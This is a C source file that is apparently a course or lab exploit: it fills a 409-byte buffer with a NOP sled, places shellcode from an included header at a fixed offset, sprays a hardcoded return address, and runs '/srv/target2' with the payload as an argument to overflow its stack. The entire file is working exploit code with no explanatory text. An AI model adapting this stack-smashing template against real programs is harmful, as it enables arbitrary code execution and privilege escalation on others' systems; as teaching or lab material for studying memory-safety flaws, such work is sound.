#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"

const int BUFFER_SIZE = 409;
const int SHELLCODE_OFFSET = 201;
const uint32_t RETURN_ADDRESS = 0xffffdb5c;

void preparePayload(char *buffer) {
    memset(buffer, 0x90, BUFFER_SIZE - 1);
    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);

    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
    }

    buffer[BUFFER_SIZE - 1] = '\0';
}

int main(void)
{
    char *args[4];
    char *env[1];
    char payload[BUFFER_SIZE];

    preparePayload(payload);

    args[0] = TARGET;
    args[1] = payload;
    args[2] = "65935";
    args[3] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}